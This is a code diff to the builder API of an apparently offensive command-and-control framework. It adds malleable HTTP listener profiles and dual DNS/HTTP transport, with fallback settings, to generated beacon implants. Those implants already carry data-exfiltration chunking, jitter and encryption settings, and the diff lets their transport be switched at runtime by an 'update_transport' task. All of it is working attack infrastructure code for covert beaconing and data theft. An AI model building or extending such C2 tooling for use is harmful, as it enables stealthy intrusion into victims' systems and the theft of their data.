@@ -41,13 +41,37 @@ type DNSServerBuildRequest struct {
 	ServerAddress string `json:"server_address"`
 	EncryptionKey string `json:"encryption_key"`
 	ForwardDNS    *bool  `json:"forward_dns"` // nil = default (true), explicit false disables forwarding
+
+	// HTTPProfileDir is where the built DNS server looks for malleable HTTP
+	// listener profiles. Empty keeps the server DNS-only.
+	HTTPProfileDir string `json:"http_profile_dir,omitempty"`
 }
 
 // PhaseConfigRequest holds per-phase malleable settings from the builder UI
+// HTTPListenerSpec mirrors the client's HTTPListener JSON schema, so one profile
+// document serves both the DNS server that loads it and the beacon that embeds
+// it. Archon holds the fields it needs to validate and forward verbatim.
+type HTTPListenerSpec struct {
+	Name         string                 `json:"name"`
+	Scheme       string                 `json:"scheme"`
+	Host         string                 `json:"host"`
+	HostHeader   string                 `json:"host_header,omitempty"`
+	SPKISHA256   string                 `json:"spki_sha256,omitempty"`
+	URIs         map[string][]string    `json:"uris"`
+	Methods      map[string]string      `json:"methods,omitempty"`
+	UserAgents   []string               `json:"user_agents,omitempty"`
+	Headers      []map[string]string    `json:"headers,omitempty"`
+	RequestBody  map[string]interface{} `json:"request_body,omitempty"`
+	ResponseBody map[string]interface{} `json:"response_body,omitempty"`
+	Auth         map[string]interface{} `json:"auth,omitempty"`
+	TimeoutSecs  int                    `json:"timeout_secs,omitempty"`
+	MaxBodyBytes int64                  `json:"max_body_bytes,omitempty"`
+}
+
 type PhaseConfigRequest struct {
-	QueryType     string `json:"query_type"`      // "TXT" or "A"
-	Encrypted     *bool  `json:"encrypted"`        // nil = use global default
-	MaxPayload    int    `json:"max_payload"`      // 0 = auto
+	QueryType     string `json:"query_type"`  // "TXT" or "A"
+	Encrypted     *bool  `json:"encrypted"`   // nil = use global default
+	MaxPayload    int    `json:"max_payload"` // 0 = auto
 	PayloadFormat string `json:"payload_format"`
 	ARecordACKIP  string `json:"a_record_ack_ip"`
 }
@@ -70,16 +94,25 @@ type ClientBuildRequest struct {
 	ExfilChunksPerBurst int      `json:"exfil_chunks_per_burst"`
 	ExfilBurstPauseMs   int      `json:"exfil_burst_pause_ms"`
 	StaticLink          bool     `json:"static_link"`
-	Resolver            string   `json:"resolver"`            // Optional: DNS resolver IP:port (empty = system resolver)
+	Resolver            string   `json:"resolver"`             // Optional: DNS resolver IP:port (empty = system resolver)
 	MaxSubdomainLength  int      `json:"max_subdomain_length"` // Legacy global (0 = default)
 	PayloadFormat       string   `json:"payload_format"`       // Legacy global
 	BeaconName          string   `json:"beacon_name"`
 	Encrypted           *bool    `json:"encrypted"` // Legacy global: nil or true = AES-GCM; false = plain base36
 	StagedRegistration  bool     `json:"staged_registration"`
 
+	// Transport selects how the beacon reaches its C2 servers: "dns" (default and
+	// the behaviour of every pre-HTTP build), "http", or "dual". HTTPListeners
+	// carries the malleable listener configuration the beacon embeds; the same
+	// profile document the DNS server loads can be used here.
+	Transport                 string             `json:"transport"`
+	HTTPListeners             []HTTPListenerSpec `json:"http_listeners,omitempty"`
+	HTTPFallbackAfterFailures int                `json:"http_fallback_after_failures,omitempty"`
+	HTTPRetryBackoffSecs      int                `json:"http_retry_backoff_secs,omitempty"`
+
 	// Per-phase malleable configuration
 	RegistrationPhase *PhaseConfigRequest     `json:"registration_phase,omitempty"`
-	PollPhase         *PollPhaseConfigRequest  `json:"poll_phase,omitempty"`
+	PollPhase         *PollPhaseConfigRequest `json:"poll_phase,omitempty"`
 	DataExfilPhase    *PhaseConfigRequest     `json:"data_exfil_phase,omitempty"`
 }
 
@@ -436,10 +469,10 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 	exfilQT, exfilEnc, exfilMaxPayload, exfilPayloadFmt, exfilACKIP := resolvePhaseConfigReq(req.DataExfilPhase, encrypted)
 
 	buildConfigMap := map[string]interface{}{
-		"sleep_min":            req.SleepMin,
-		"sleep_max":            req.SleepMax,
-		"exfil_jitter_min_ms":  req.ExfilJitterMinMs,
-		"exfil_jitter_max_ms":  req.ExfilJitterMaxMs,
+		"sleep_min":              req.SleepMin,
+		"sleep_max":              req.SleepMax,
+		"exfil_jitter_min_ms":    req.ExfilJitterMinMs,
+		"exfil_jitter_max_ms":    req.ExfilJitterMaxMs,
 		"exfil_chunks_per_burst": req.ExfilChunksPerBurst,
 		"exfil_burst_pause_ms":   req.ExfilBurstPauseMs,
 		"max_subdomain_length":   req.MaxSubdomainLength,
@@ -457,12 +490,12 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 			"a_record_ack_ip": regACKIP,
 		},
 		"poll_phase": map[string]interface{}{
-			"query_type":       pollQT,
-			"encrypted":        pollEnc,
-			"max_payload":      pollMaxPayload,
-			"payload_format":   pollPayloadFmt,
-			"a_record_ack_ip":  pollACKIP,
-			"a_record_task_ip": pollTaskIP,
+			"query_type":         pollQT,
+			"encrypted":          pollEnc,
+			"max_payload":        pollMaxPayload,
+			"payload_format":     pollPayloadFmt,
+			"a_record_ack_ip":    pollACKIP,
+			"a_record_task_ip":   pollTaskIP,
 			"txt_follow_up_secs": txtFollowUp,
 		},
 		"data_exfil_phase": map[string]interface{}{
@@ -508,7 +541,6 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 
 	api.sendSuccess(w, msg, artifact)
 }
-
 
 // handleBuildStager builds a stager binary with provided configuration
 func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) {
@@ -790,6 +822,14 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	configStr = strings.ReplaceAll(configStr, "NS1:           \"ns1.example.com\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1))
 	configStr = strings.ReplaceAll(configStr, "NS2:           \"ns2.example.com\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2))
 
+	// HTTP listener profiles ship with the DNS server build. Both Config literals
+	// are rewritten so DefaultConfig and the embedded config agree.
+	if req.HTTPProfileDir != "" {
+		configStr = strings.ReplaceAll(configStr,
+			"HTTPProfileDir: \"/opt/unkn0wnc2/profiles\",",
+			fmt.Sprintf("HTTPProfileDir: %q,", req.HTTPProfileDir))
+	}
+
 	// Verify Domain was replaced
 	if strings.Contains(configStr, "Domain:        \"example.com\",") {
 		return "", fmt.Errorf("domain replacement failed - example.com still present")
@@ -997,7 +1037,25 @@ func buildClient(req ClientBuildRequest, sourceRoot, encryptionKey, buildID stri
 		serverDomain = req.DNSDomains[0]
 	}
 
+	// HTTP transport travels to the beacon as JSON, not as a generated Go literal:
+	// the listeners are the same document the DNS server loads, and hand-generating
+	// nested Go source for them would be one more thing to keep in step.
+	transportMode := req.Transport
+	if transportMode == "" {
+		transportMode = "dns"
+	}
+	listenersJSON := ""
+	if len(req.HTTPListeners) > 0 {
+		encoded, err := json.Marshal(req.HTTPListeners)
+		if err != nil {
+			return "", fmt.Errorf("failed to encode HTTP listeners: %w", err)
+		}
+		listenersJSON = string(encoded)
+	}
+
 	configContent := fmt.Sprintf(`package main
+
+import "encoding/json"
 
 // This file is auto-generated at build time by the Master builder
 // DO NOT EDIT MANUALLY
@@ -1051,8 +1109,28 @@ var embeddedConfig = Config{
 	},
 }
 
+// HTTP transport. The mode is set at build time and can be replaced at runtime
+// by an update_transport task, the same channel Shadow Mesh domains use.
+var (
+	embeddedTransportMode     = %q
+	embeddedFallbackAfter     = %d
+	embeddedRetryBackoffSecs  = %d
+	embeddedHTTPListenersJSON = %q
+)
+
 func getConfig() Config {
-	return embeddedConfig
+	cfg := embeddedConfig
+	cfg.Transport = embeddedTransportMode
+	cfg.HTTPFallbackAfterFailures = embeddedFallbackAfter
+	cfg.HTTPRetryBackoffSecs = embeddedRetryBackoffSecs
+
+	if embeddedHTTPListenersJSON != "" {
+		var listeners []HTTPListener
+		if err := json.Unmarshal([]byte(embeddedHTTPListenersJSON), &listeners); err == nil {
+			cfg.HTTPListeners = listeners
+		}
+	}
+	return cfg
 }
 `, serverDomain, domainsStr, resolver, encodingMode, encryptionKey,
 		req.SleepMin, req.SleepMax, req.ExfilJitterMinMs, req.ExfilJitterMaxMs,
@@ -1061,7 +1139,8 @@ func getConfig() Config {
 		regQT, regEnc, regMaxPayload, regPayloadFmt, regACKIP,
 		pollQT, pollEnc, pollMaxPayload, pollPayloadFmt, pollACKIP,
 		pollTaskIP, txtFollowUp,
-		exfilQT, exfilEnc, exfilMaxPayload, exfilPayloadFmt, exfilACKIP)
+		exfilQT, exfilEnc, exfilMaxPayload, exfilPayloadFmt, exfilACKIP,
+		transportMode, req.HTTPFallbackAfterFailures, req.HTTPRetryBackoffSecs, listenersJSON)
 
 	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
 		return "", fmt.Errorf("failed to write config: %w", err)
